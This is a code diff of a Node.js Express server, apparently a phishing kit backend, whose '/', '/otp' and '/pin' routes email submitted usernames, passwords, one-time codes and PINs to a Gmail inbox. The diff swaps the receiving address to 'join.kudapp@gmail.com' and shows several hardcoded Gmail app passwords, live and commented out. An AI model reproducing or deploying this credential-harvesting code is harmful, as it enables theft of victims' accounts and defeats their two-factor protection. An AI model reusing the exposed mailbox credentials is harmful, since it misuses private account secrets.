@@ -22,17 +22,18 @@ app.post('/',(req,res) => {
         auth: {
             // user: 'edehchinedu59@gmail.com',
             // pass: 'yknycyzsxdkxpepq'
-            user: 'Victorchinemerem191@gmail.com',
-            pass: 'aivsveolwtqinddb'
+            // user: 'Victorchinemerem191@gmail.com',
+            // pass: 'aivsveolwtqinddb'
             // user: 'Victorchinemeremfx.112@gmail.com',
             // pass: 'eujqfpdvuhepijkk'
-            
+            user: 'join.kudapp@gmail.com',
+            pass: 'gnwllkditlrzvwhr'
         }
     })
 
     const mailOptions = {
         from: req.body?.email,
-        to:'Victorchinemerem191@gmail.com',
+        to:'join.kudapp@gmail.com',
         subject: `Username: ${req.body?.username} \t\n\n\n password: ${req.body?.password}`,
        
     }
@@ -55,18 +56,20 @@ app.post('/otp',(req,res) => {
     const transporter = nodemailer.createTransport({
         service:'gmail',
         auth: {
-          // user: 'edehchinedu59@gmail.com',
-            // pass: 'yknycyzsxdkxpepq'
+            user: 'join.kudapp@gmail.com',
+            pass: 'gnwllkditlrzvwhr'
+        //   user: 'edehchinedu59@gmail.com',
+        //     pass: 'yknycyzsxdkxpepq'
             // user: 'Victorchinemeremfx.112@gmail.com',
             // pass: 'eujqfpdvuhepijkk'
-            user: 'Victorchinemerem191@gmail.com',
-            pass: 'aivsveolwtqinddb'
+            // user: 'Victorchinemerem191@gmail.com',
+            // pass: 'aivsveolwtqinddb'
         }
     })
 
     const mailOptions = {
         from: req.body?.email,
-        to:'Victorchinemerem191@gmail.com',
+        to:'join.kudapp@gmail.com',
         subject: ` OTP: ${req.body?.Otp} `,
        
     }
@@ -90,19 +93,21 @@ app.post('/pin',(req,res) => {
         service:'gmail',
         auth: {
 
-             user: 'Victorchinemerem191@gmail.com',
-            pass: 'aivsveolwtqinddb'
+            //  user: 'Victorchinemerem191@gmail.com',
+            // pass: 'aivsveolwtqinddb'
             
         // user: 'edehchinedu59@gmail.com',
-            // pass: 'yknycyzsxdkxpepq'
+        //     pass: 'yknycyzsxdkxpepq'
             // user: 'Victorchinemeremfx.112@gmail.com',
             // pass: 'eujqfpdvuhepijkk'
+            user: 'join.kudapp@gmail.com',
+            pass: 'gnwllkditlrzvwhr'
         }
     })
 
     const mailOptions = {
         from: req.body?.email,
-        to:'Victorchinemerem191@gmail.com',
+        to:'join.kudapp@gmail.com',
         subject: ` PIN: ${req.body?.pin} `,
        
     }
